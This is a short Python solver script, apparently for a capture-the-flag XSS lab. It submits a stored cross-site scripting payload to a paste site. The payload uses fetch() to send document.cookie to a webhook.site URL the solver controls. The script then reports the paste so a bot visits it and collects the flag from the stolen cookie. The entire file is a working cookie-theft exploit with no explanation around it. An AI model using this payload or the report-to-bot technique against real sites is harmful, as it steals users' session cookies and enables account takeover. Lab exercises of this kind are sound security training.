import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, WebhookSite

class Solver:
    def __init__(self):
        self.session = get_session()
        self.webhooksite = WebhookSite()

    def main(self):
        BASE_URL = "https://xss-playground-2.quoccacorp.com"

        PAYLOAD = f'<script>fetch(`{self.webhooksite.url}?q=${{document.cookie}}`)</script>'
        response = self.session.post(BASE_URL, data={"paste": PAYLOAD})

        self.session.post(f"{BASE_URL}/report", data={"url": response.url})
        self.webhooksite.find_flags()

if __name__ == "__main__":
    Solver().main()
